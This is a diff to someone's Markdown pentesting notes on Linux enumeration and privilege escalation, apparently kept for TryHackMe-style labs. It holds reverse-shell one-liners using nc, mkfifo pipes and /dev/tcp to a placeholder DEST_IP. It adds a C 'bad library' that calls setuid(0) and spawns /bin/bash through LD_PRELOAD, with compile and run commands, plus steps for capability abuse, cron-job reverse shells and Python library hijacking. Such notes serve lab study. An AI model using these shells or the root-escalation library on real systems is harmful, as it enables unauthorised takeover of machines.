@@ -90,6 +90,12 @@
   - -l = long format
   - -ax/aux = comparable
   - -j = job format
+  
+- [pspy](https://github.com/DominicBreuker/pspy)
+  - -pf: command + file system
+  - -i 1000 = every ms
+
+
 
 ## Ping and Port Scanning
 -  hosts: for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
@@ -109,7 +115,7 @@
   - nc DEST_IP DEST_PORT -c "/bin/bash 2>&1"
   - nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
   - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
-  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
+  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f
   - **No NC**:
     - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
     - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
@@ -147,7 +153,8 @@
 - https://tryhackme.com/room/linprivesc
 - Check list
   - hostname
-  - uname -a = sys info, kernel, 
+  - uname -a = sys info, kernel
+    - cat /etc/lsb-release
   - /proc/version = process, compiler,
   - /etc/issue = OS info
   - ps a[all]u[who_launched]x[not_terminal]  (all users)| -a | axjf (tree)= process list
@@ -173,14 +180,55 @@
 - sudo -l ==> LD_PRELOAD ==>   
 - https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
 - ldd = shared object dependencies
+  - ldd /path/to/file
+
+```
+# Bad library
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+# Compile bad library
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+
+# Run executable with library
+LD_PRELOAD=root.so executable restart
+```
+
+- non-standard libraries
+  - readelf -d EXECUTABLE = find path of non standard library
+
+- Find function executed in the file
+- Create malicious file with function name 
+- compile malicious file and put in the folder
+- Execute target file
+
 
 ## capabilities
+- find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+- binary can set perform specific actions
+  - cap_sys_admin
+  - cap_sys_chroot
+  - cap_setuid
+  - cap_dac_override
+  - +ep = effective and permitted privielges
+  - +ei=inheritable priielges + child process
+  - +p=for specific no inherent
 - getcap -r / 2>/dev/null
+- setcap CAP_NAME= /path/to/file
 
 ## Cronjobs
 - privilege of the owner
 - find script with root privilege
 - /etc/crontab
+- /etc/cron.d
 - check if file has no fullpath + create own script with reverse shell
 
 ## PATH
@@ -199,6 +247,10 @@
 - SETENV enabled?
 - Execute script setting path
   - sudo PYTHONPATH=/path/to/bad/library script
+- Modify library
+  - pip3 show library = location of the library
+  - Has the lib write permission?
+    - python3 -c 'import sys; print("\n".join(sys.path))'
 
 ## NFS
 - find root key + connect
